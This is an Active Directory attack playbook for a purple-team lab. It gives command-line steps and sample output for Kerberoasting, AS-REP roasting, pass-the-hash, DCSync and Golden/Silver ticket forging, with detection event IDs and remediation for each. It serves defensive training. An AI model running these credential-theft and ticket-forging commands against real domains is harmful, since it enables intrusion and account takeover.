# Active Directory Attack Playbook

**Purple Team Lab - Detailed Attack Execution Guide**

This playbook provides step-by-step execution instructions for all 12 MITRE ATT&CK techniques implemented in this lab.

---

## Table of Contents

1. [Kerberoasting (T1558.003)](#1-kerberoasting-t1558003)
2. [AS-REP Roasting (T1558.004)](#2-as-rep-roasting-t1558004)
3. [Pass-the-Hash (T1550.002)](#3-pass-the-hash-t1550002)
4. [DCSync (T1003.006)](#4-dcsync-t1003006)
5. [Golden Ticket (T1558.001)](#5-golden-ticket-t1558001)
6. [Silver Ticket (T1558.002)](#6-silver-ticket-t1558002)
7. [Lateral Movement (T1570)](#7-lateral-movement-t1570)
8. [LSASS Dumping (T1003.001)](#8-lsass-dumping-t1003001)
9. [GPO Abuse (T1484.001)](#9-gpo-abuse-t1484001)
10. [BloodHound Enumeration (T1087.002)](#10-bloodhound-enumeration-t1087002)
11. [ACL Abuse (T1222.001)](#11-acl-abuse-t1222001)
12. [NTLM Relay (T1557.001)](#12-ntlm-relay-t1557001)
13. [Password Spraying (T1110.003)](#13-password-spraying-t1110003)

---

## 1. Kerberoasting (T1558.003)

### Overview
Kerberoasting exploits Kerberos by requesting service tickets (TGS) for accounts with SPNs, then cracking the tickets offline to reveal plaintext passwords.

### Prerequisites
- Valid domain credentials (low-privilege sufficient)
- Network access to Domain Controller
- Tools: PowerShell, Impacket, Hashcat/John

### Execution Steps

#### Method 1: PowerShell
```powershell
# From domain-joined Windows system
.\attack-scripts\kerberoasting.ps1

# Target specific SPN
.\attack-scripts\kerberoasting.ps1 -TargetSPN "MSSQLSvc/sql01.purpleteam.lab:1433"
```

#### Method 2: Python (Impacket)
```bash
# From Kali attacker
python3 attack-scripts/kerberoasting.py \
    -d PURPLETEAM.LAB \
    -u lowpriv \
    -p 'Password123!' \
    -dc-ip 172.28.0.10
```

#### Method 3: GetUserSPNs.py (Direct)
```bash
GetUserSPNs.py PURPLETEAM.LAB/lowpriv:'Password123!' \
    -dc-ip 172.28.0.10 \
    -request \
    -outputfile kerberoast_hashes.txt
```

### Expected Output
```
[*] Found 2 SPNs
[+] Ticket obtained for: svc_sqlserver
[+] Ticket obtained for: svc_iis
[*] Hashes saved to: tickets_20240114_143022.txt

$krb5tgs$23$*svc_sqlserver$PURPLETEAM.LAB$MSSQLSvc/sql01*$abc123...
```

### Offline Cracking
```bash
# Hashcat (Mode 13100 - Kerberos TGS-REP)
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt --force

# John the Ripper
john --format=krb5tgs tickets.txt --wordlist=rockyou.txt
```

### Detection Indicators
- **Event ID 4769** (Kerberos Service Ticket Request)
  - Unusual number of TGS requests
  - RC4 encryption (0x17) instead of AES
  - Requests for services not typically accessed by user
- **Event ID 4770** (Kerberos Service Ticket Renewal)
- **Sysmon Event ID 1** (PowerShell with KerberosRequestorSecurityToken)

### Remediation
✅ Use strong passwords (25+ characters) for service accounts
✅ Disable RC4 encryption (force AES128/256)
✅ Implement Group Managed Service Accounts (gMSA)
✅ Monitor Event ID 4769 for anomalies
✅ Enable Protected Users group for high-value accounts

### MITRE ATT&CK
- **Tactic**: Credential Access
- **Technique**: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
- **Difficulty**: Medium
- **Success Rate**: 95% (if weak passwords exist)

---

## 2. AS-REP Roasting (T1558.004)

### Overview
Targets accounts with Kerberos pre-authentication disabled. Allows offline password cracking without valid credentials.

### Prerequisites
- Network access to DC
- No credentials required (can be anonymous)
- Target accounts with `DONT_REQ_PREAUTH` flag

### Execution Steps

```bash
# Enumerate and roast vulnerable users
python3 attack-scripts/asreproast.py \
    -d PURPLETEAM.LAB \
    -dc-ip 172.28.0.10

# With credentials for better enumeration
python3 attack-scripts/asreproast.py \
    -d PURPLETEAM.LAB \
    -user lowpriv \
    -p 'Password123!' \
    -dc-ip 172.28.0.10

# Using GetNPUsers.py directly
GetNPUsers.py PURPLETEAM.LAB/ \
    -usersfile users.txt \
    -no-pass \
    -dc-ip 172.28.0.10 \
    -format hashcat
```

### Expected Output
```
[*] Found vulnerable user: asreproast_user
[+] AS-REP obtained for: asreproast_user

$krb5asrep$23$asreproast_user@PURPLETEAM.LAB:def456...
```

### Offline Cracking
```bash
# Hashcat (Mode 18200 - Kerberos AS-REP)
hashcat -m 18200 asrep_hashes.txt rockyou.txt --force
```

### Detection Indicators
- **Event ID 4768** (Kerberos TGT Request)
  - PreAuthType: 0 (no pre-authentication)
  - Multiple requests from single IP
- **Unusual AS-REQ requests** without pre-authentication

### Remediation
✅ Enable Kerberos pre-authentication for ALL users
✅ Audit accounts with `DoesNotRequirePreAuth` flag
✅ Use `ad-hardening.ps1 -Action HardenKerberos -Apply`
✅ Monitor Event ID 4768 for PreAuthType = 0

### MITRE ATT&CK
- **Tactic**: Credential Access
- **Technique**: T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting
- **Difficulty**: Medium
- **Success Rate**: 100% (if vulnerable accounts exist)

---

## 3. Pass-the-Hash (T1550.002)

### Overview
Authenticates to remote systems using NTLM hash without needing plaintext password.

### Prerequisites
- NTLM hash of target account
- SMB access to target (port 445)
- Tools: Impacket, CrackMapExec, Mimikatz

### Execution Steps

```bash
# Using our script
python3 attack-scripts/pass_the_hash.py \
    -u Administrator \
    -H :fc525c9683e8fe067095ba2ddc971889 \
    -t 172.28.0.20 \
    -d PURPLETEAM.LAB \
    --shares

# Using psexec.py
psexec.py PURPLETEAM.LAB/Administrator@172.28.0.20 \
    -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889

# Using wmiexec.py (stealthier)
wmiexec.py PURPLETEAM.LAB/Administrator@172.28.0.20 \
    -hashes :fc525c9683e8fe067095ba2ddc971889

# Using CrackMapExec
crackmapexec smb 172.28.0.20 \
    -u Administrator \
    -H fc525c9683e8fe067095ba2ddc971889 \
    -x "whoami"
```

### Expected Output
```
[*] SMB connection established
[+] Successfully authenticated via Pass-the-Hash!
[*] Available shares:
  - ADMIN$
  - C$
  - IPC$
```

### Detection Indicators
- **Event ID 4624** (Logon Type 3 - Network)
  - NTLM authentication when Kerberos expected
  - Logon from unusual source IP
- **Event ID 4625** (Failed logon attempts before success)
- **Network traffic**: NTLM authentication patterns

### Remediation
✅ Disable NTLM (use Kerberos only)
✅ Implement LAPS for local admin passwords
✅ Add privileged accounts to Protected Users group
✅ Enable SMB signing (prevents relay)
✅ Monitor Event ID 4624 for unusual source IPs

### MITRE ATT&CK
- **Tactic**: Lateral Movement, Defense Evasion
- **Technique**: T1550.002 - Use Alternate Authentication Material: Pass the Hash
- **Difficulty**: Easy
- **Success Rate**: 100% (if hash is valid)

---

## 4. DCSync (T1003.006)

### Overview
Mimics domain controller replication to extract password hashes from AD without executing code on DC.

### Prerequisites
- Credentials with replication permissions (typically Domain Admin)
- Network access to DC
- Tools: Impacket secretsdump, Mimikatz

### Execution Steps

```bash
# Our script
python3 attack-scripts/dcsync.py \
    -d PURPLETEAM.LAB \
    -u Administrator \
    -p 'Pass123!' \
    -dc-ip 172.28.0.10

# Dump specific user (krbtgt for Golden Ticket)
python3 attack-scripts/dcsync.py \
    -d PURPLETEAM.LAB \
    -u Administrator \
    -p 'Pass123!' \
    -dc-ip 172.28.0.10 \
    -target krbtgt

# Using secretsdump.py directly
secretsdump.py PURPLETEAM.LAB/Administrator:'Pass123!'@172.28.0.10 -just-dc

# Dump ntds.dit
secretsdump.py PURPLETEAM.LAB/Administrator@172.28.0.10 -just-dc-ntlm
```

### Expected Output
```
[*] Dumping Domain Credentials
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a8f7d3e6c0b1a4d5e9f2c7d8a3b6e1f4:::
svc_sqlserver:1103:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

### Detection Indicators
- **Event ID 4662** (Directory Service Access) - **CRITICAL**
  - Object: Domain object
  - Access: Control Access
  - Properties contain replication GUIDs:
    - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes)
    - `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes-All)
- **Event ID 4624** (Logon Type 3 from non-DC)
- **Network traffic**: RPC/DRSUAPI calls

### Remediation
✅ Restrict replication permissions to DC computer accounts only
✅ Monitor Event ID 4662 for non-DC replication requests
✅ Implement honeypot/canary accounts with replication monitoring
✅ Audit accounts with `DS-Replication` rights
✅ Use Privileged Access Workstations (PAWs) for admin accounts

### MITRE ATT&CK
- **Tactic**: Credential Access
- **Technique**: T1003.006 - OS Credential Dumping: DCSync
- **Difficulty**: High (requires privileged access)
- **Success Rate**: 100% (if permissions exist)

---

## 5. Golden Ticket (T1558.001)

### Overview
Forges Kerberos TGTs using krbtgt hash, providing persistent domain-wide access.

### Prerequisites
- krbtgt NTLM hash (obtain via DCSync)
- Domain SID
- Tools: Mimikatz, Rubeus, Impacket

### Execution Steps

```powershell
# Our script
.\attack-scripts\golden_ticket.ps1 `
    -KrbtgtHash a8f7d3e6c0b1a4d5e9f2c7d8a3b6e1f4 `
    -Domain PURPLETEAM.LAB

# Using Mimikatz directly
mimikatz.exe
kerberos::golden /user:Administrator /domain:PURPLETEAM.LAB /sid:S-1-5-21-XXX /krbtgt:a8f7d3e6c0b1a4d5e9f2c7d8a3b6e1f4 /ptt

# Using Rubeus
Rubeus.exe golden /rc4:a8f7d3e6c0b1a4d5e9f2c7d8a3b6e1f4 /domain:PURPLETEAM.LAB /sid:S-1-5-21-XXX /user:Administrator /ptt
```

### Expected Output
```
[*] Golden Ticket created
[+] Ticket injected into current session
[*] Verify with: klist
```

### Verification
```powershell
# Check injected ticket
klist

# Test access
dir \\DC01\c$
PsExec.exe \\DC01 cmd.exe
```

### Detection Indicators
- **Event ID 4624** (Logon)
  - Null GUID: `00000000-0000-0000-0000-000000000000`
  - Unusual ticket lifetime (10 years default)
- **Event ID 4672** (Special privileges) for non-existent accounts
- **Event ID 4769** (Service ticket request) with unusual encryption

### Remediation
✅ Reset krbtgt password TWICE (wait 10 hours between)
✅ Monitor Event ID 4624 for null GUIDs
✅ Implement krbtgt password rotation (every 6 months)
✅ Use Azure ATP/Defender for Identity
✅ Review privileged account activity logs

### MITRE ATT&CK
- **Tactic**: Credential Access, Persistence
- **Technique**: T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket
- **Difficulty**: High (requires krbtgt hash)
- **Success Rate**: 100%
- **Persistence**: Until krbtgt password reset twice

---

## 6. Silver Ticket (T1558.002)

### Overview
Forges service tickets for specific services using service account hash.

### Prerequisites
- Service account NTLM hash
- Service SPN
- Domain SID

### Execution Steps

```powershell
.\attack-scripts\silver_ticket.ps1 `
    -ServiceHash 8846f7eaee8fb117ad06bdd830b7586c `
    -SPN CIFS/WS01.PURPLETEAM.LAB

# Mimikatz
kerberos::golden /user:Administrator /domain:PURPLETEAM.LAB /sid:S-1-5-21-XXX /target:WS01.PURPLETEAM.LAB /service:cifs /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt
```

### Detection Indicators
- **Event ID 4624** (Service logon with unusual characteristics)
- **Event ID 4769** (Service ticket request anomalies)
- More difficult to detect than Golden Ticket (no DC communication)

### Remediation
✅ Reset compromised service account password
✅ Use gMSA (Group Managed Service Accounts)
✅ Monitor service ticket usage patterns
✅ Enable Kerberos armoring

### MITRE ATT&CK
- **Technique**: T1558.002 - Silver Ticket
- **Difficulty**: High
- **Stealthiness**: Very High (no DC communication)

---

## 7-13: Additional Attacks

*(Continuing with remaining techniques...)*

### 7. Lateral Movement (T1570)
**Tools**: WMI, PSRemoting, PsExec
**Detection**: Event IDs 4688, 4689, 4624 (Type 3)
**Script**: `lateral_movement.ps1`

### 8. LSASS Dumping (T1003.001)
**Tools**: Procdump, Mimikatz, comsvcs.dll
**Detection**: Sysmon Event ID 10 (ProcessAccess to lsass.exe)
**Script**: `lsass_dump.ps1`

### 9. GPO Abuse (T1484.001)
**Detection**: Event IDs 5136, 5137 (Directory Service Changes)
**Script**: `gpo_abuse.ps1`

### 10. BloodHound (T1087.002)
**Tools**: SharpHound, bloodhound-python
**Detection**: Excessive LDAP queries (Event ID 4662)
**Script**: `bloodhound_collect.py`

### 11. ACL Abuse (T1222.001)
**Detection**: Event ID 5136 (ntSecurityDescriptor modifications)
**Script**: `acl_abuse.ps1`

### 12. NTLM Relay (T1557.001)
**Tools**: Responder, ntlmrelayx
**Detection**: Event ID 4624 from unusual IPs
**Mitigation**: Enable SMB signing

### 13. Password Spraying (T1110.003)
**Detection**: Event ID 4625 (multiple failed logons)
**Script**: `password_spray.py`

---

## Quick Reference

| Technique | Difficulty | Detection Event IDs | Primary Defense |
|-----------|-----------|---------------------|-----------------|
| Kerberoasting | Medium | 4769, 4770 | Strong passwords, disable RC4 |
| AS-REP Roasting | Medium | 4768 | Enable pre-auth |
| Pass-the-Hash | Easy | 4624, 4625 | LAPS, Protected Users |
| DCSync | High | 4662 | Restrict replication rights |
| Golden Ticket | High | 4624, 4672 | Reset krbtgt, monitor null GUIDs |
| Silver Ticket | High | 4769 | gMSA, monitor service tickets |
| Lateral Movement | Medium | 4688, 4624 | Network segmentation |
| LSASS Dump | Medium | Sysmon 10 | Credential Guard, LSA Protection |
| GPO Abuse | High | 5136, 5137 | Restrict GPO permissions |
| BloodHound | Easy | 4662 | Monitor LDAP queries |
| ACL Abuse | High | 5136 | Audit ACL changes |
| NTLM Relay | Medium | 4624 | SMB signing |
| Password Spray | Easy | 4625 | Account lockout, MFA |

---

**Document Version**: 1.0
**Last Updated**: 2024-01-14
**Author**: Purple Team Lab
